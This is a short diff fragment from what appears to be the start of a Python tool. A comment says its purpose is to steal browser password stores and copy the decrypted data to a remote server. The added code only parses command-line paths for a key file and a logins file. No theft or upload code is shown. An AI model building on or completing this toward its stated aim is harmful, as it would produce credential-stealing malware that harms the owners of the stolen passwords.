@@ -4,3 +4,18 @@
 
 ## The intent of this program is to steal browser password stores and copy the decrypted data to a remote server.
 
+import argparse
+import sys
+import os
+
+def grab_ComandLine(): # Function to grab command line arguments.
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-k', type=str, required=True, help='Key File')
+    parser.add_argument('-l', type=str, required=True, help='Logins')
+    
+    args = parser.parse_args()
+    keyFilePath = args.k
+    loginsFilePath = args.l
+    
+    return keyFilePath, loginsFilePath
+
